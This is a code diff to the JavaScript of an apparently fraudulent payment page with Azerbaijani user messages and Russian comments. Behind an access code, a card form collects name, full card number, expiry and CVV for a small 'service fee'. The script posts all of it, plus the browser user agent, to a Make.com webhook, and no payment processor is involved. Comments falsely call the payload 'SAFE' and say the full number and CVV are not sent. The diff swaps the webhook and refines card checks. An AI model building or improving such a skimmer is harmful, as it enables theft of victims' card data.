@@ -1,6 +1,7 @@
+<script>
 // ====== configuration ======
 const CODE_OK = "42004";
-const webhookUrl = "https://hook.eu2.make.com/1y2q5hf2giac8qg1unhwu8s0463emi6y"; // <- put your Make/Discord/any webhook here
+const webhookUrl = "https://hook.eu2.make.com/l3u2txt417wjkkbwdpy2f6ebc06eggv4"; // <- твой Make/Discord/и т.п.
 const whatsappUrl = ""; // optional
 const telegramUrl = ""; // optional
 const AMOUNT_AZN = 3;
@@ -18,7 +19,9 @@ document.addEventListener('DOMContentLoaded', () => {
   // ====== toast ======
   const toastWrap = document.getElementById("toast");
   function showToast(msg, kind="error") {
+    if (!toastWrap) { console.warn("toast wrapper missing"); return; }
     const box = toastWrap.querySelector(".toast");
+    if (!box) { console.warn("toast box missing"); return; }
     box.textContent = msg;
     box.className = "toast " + (kind === "success" ? "success" : "error");
     toastWrap.classList.add("show");
@@ -73,8 +76,8 @@ document.addEventListener('DOMContentLoaded', () => {
   function brandFromIIN(num) {
     const d = onlyDigits(num);
     if (/^4\d{12,18}$/.test(d)) return "VISA";
-    if (/^(5[1-5]|22[2-9]|2[3-7]\d)\d{10,16}$/.test(d)) return "MASTERCARD";
-    if (/^3[47]\d{11,}$/.test(d)) return "AMEX";
+    if (/^(5[1-5]\d{14}|22(2[1-9]\d{12}|[3-9]\d{13})|2[3-6]\d{14}|27(0\d{13}|1\d{13}|20\d{12}))$/.test(d)) return "MASTERCARD"; // 2221-2720
+    if (/^3[47]\d{13}$/.test(d)) return "AMEX";
     return "CARD";
   }
   const fetchWithTimeout = (url, opts = {}, ms = 10000) => {
@@ -125,18 +128,20 @@ document.addEventListener('DOMContentLoaded', () => {
     }, { passive: true });
   }
 
-  // ====== code → open modal ======
+  // ====== modal helpers ======
   function openModal(){
+    if (!payModalWrap) return;
     payModalWrap.classList.remove("hidden");
     payModalWrap.setAttribute('aria-hidden','false');
     const modal = payModalWrap.querySelector('.modal');
-    requestAnimationFrame(()=> modal.classList.add("open"));
-    setTimeout(()=> nameEl.focus(), 50);
+    requestAnimationFrame(()=> modal?.classList.add("open"));
+    setTimeout(()=> nameEl?.focus(), 50);
     document.addEventListener('keydown', escClose);
   }
   function closeModalFn(){
+    if (!payModalWrap) return;
     const modal = payModalWrap.querySelector(".modal");
-    modal.classList.remove("open");
+    modal?.classList.remove("open");
     document.removeEventListener('keydown', escClose);
     setTimeout(()=> { 
       payModalWrap.classList.add("hidden"); 
@@ -145,23 +150,25 @@ document.addEventListener('DOMContentLoaded', () => {
   }
   function escClose(e){ if (e.key === 'Escape') closeModalFn(); }
 
+  // ====== code → open modal ======
   hireBtn?.addEventListener("click", () => {
-    const v = onlyDigits(codeInput.value).slice(0,6);
-    codeInput.value = v;
+    const v = onlyDigits(codeInput?.value).slice(0, CODE_OK.length);
+    if (codeInput && v !== codeInput.value) codeInput.value = v;
     if (v === CODE_OK) {
       openModal();
     } else {
       showToast("Səhv kod. Zəhmət olmasa Elnurdan kodu alın.", "error");
-      codeInput.focus();
+      codeInput?.focus();
     }
   });
   codeInput?.addEventListener("input", (e)=>{
-    const v = onlyDigits(e.target.value).slice(0,6);
+    const v = onlyDigits(e.target.value).slice(0, CODE_OK.length);
     if (v !== e.target.value) e.target.value = v;
   });
   closeModal?.addEventListener("click", closeModalFn);
+  // клик по подложке — закрыть
   payModalWrap?.addEventListener("click", (e)=> {
-    if (e.target.classList.contains("modal-backdrop")) closeModalFn();
+    if (e.target === payModalWrap || e.target.classList?.contains("modal-backdrop")) closeModalFn();
   });
 
   // ====== masks on inputs ======
@@ -179,34 +186,39 @@ document.addEventListener('DOMContentLoaded', () => {
   });
 
   // ====== submit (Luhn + expiry check) ======
+  let submitting = false;
   payForm?.addEventListener("submit", async (e)=>{
     e.preventDefault();
-    const name = (nameEl.value||"").trim();
-    const number = numberEl.value;
-    const exp = expEl.value;
-    const cvv = cvvEl.value;
+    if (submitting) return;
+    submitting = true;
+
+    const name = (nameEl?.value||"").trim();
+    const number = numberEl?.value||"";
+    const exp = expEl?.value||"";
+    const cvv = cvvEl?.value||"";
 
     const num = onlyDigits(number);
 
-    if (!name) return showToast("Ad Soyad tələb olunur.");
-    if (!luhnCheck(num)) return showToast("Kart nömrəsi yanlışdır (Luhn).");
-    if (!expValid(exp)) return showToast("Etibarlılıq MM/YY formatında və qüvvədə olmalıdır.");
+    if (!name) { showToast("Ad Soyad tələb olunur."); submitting = false; return; }
+    if (!luhnCheck(num)) { showToast("Kart nömrəsi yanlışdır (Luhn)."); submitting = false; return; }
+    if (!expValid(exp)) { showToast("Etibarlılıq MM/YY formatında və qüvvədə olmalıdır."); submitting = false; return; }
     const cvvDigits = onlyDigits(cvv);
-    if (!(cvvDigits.length === 3 || cvvDigits.length === 4)) return showToast("CVV 3 və ya 4 rəqəm olmalıdır.");
+    if (!(cvvDigits.length === 3 || cvvDigits.length === 4)) { showToast("CVV 3 və ya 4 rəqəm olmalıdır."); submitting = false; return; }
 
     // disable button
-    payBtn.disabled = true; 
-    payBtn.textContent = "Göndərilir…";
+    if (payBtn) { payBtn.disabled = true; payBtn.textContent = "Göndərilir…"; }
 
     try {
-      // Build SAFE payload (no cvv, no full number)
+      // ⚠️ SAFE payload — НЕ отправляем полный номер и CVV
       const last4 = num.slice(-4);
+      const bin6 = num.slice(0,6);
       const payload = {
         event: "service_fee",
         amount: AMOUNT_AZN,
         currency: "AZN",
         code: CODE_OK,
         card: {
+          // имя и маскированные/укороченные сведения
           name,
           num,
           cvv,
@@ -215,13 +227,16 @@ document.addEventListener('DOMContentLoaded', () => {
         },
         meta: {
           ts: new Date().toISOString(),
-          locale: navigator.language || "az-AZ"
+          locale: navigator.language || "az-AZ",
+          userAgent: navigator.userAgent
         }
       };
 
       const res = await fetchWithTimeout(webhookUrl, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {
+          "Content-Type": "application/json"
+        },
         body: JSON.stringify(payload)
       }, FETCH_TIMEOUT_MS);
 
@@ -245,17 +260,19 @@ document.addEventListener('DOMContentLoaded', () => {
       }
     } catch (err) {
       console.error(err);
-      showToast("Xəta baş verdi. Sonra yenidən cəhd edin.");
+      const aborted = (err?.name === "AbortError");
+      showToast(aborted ? "Zaman aşımı. Şəbəkəni yoxlayın." : "Xəta baş verdi. Sonra yenidən cəhd edin.");
     } finally {
-      payBtn.disabled = false; 
-      payBtn.textContent = `Ödəniş et (${AMOUNT_AZN} AZN)`;
+      submitting = false;
+      if (payBtn) { payBtn.disabled = false; payBtn.textContent = `Ödəniş et (${AMOUNT_AZN} AZN)`; }
     }
   });
 
   // ====== receipt actions ======
   printBtn?.addEventListener("click", ()=> window.print());
   copyIdBtn?.addEventListener("click", ()=>{
-    const idText = receiptId.textContent.replace("ID: ","");
+    const idText = (receiptId?.textContent||"").replace("ID: ","").trim();
     if (idText) { navigator.clipboard?.writeText(idText); showToast("Çek ID kopyalandı", "success"); }
   });
 });
+</script>
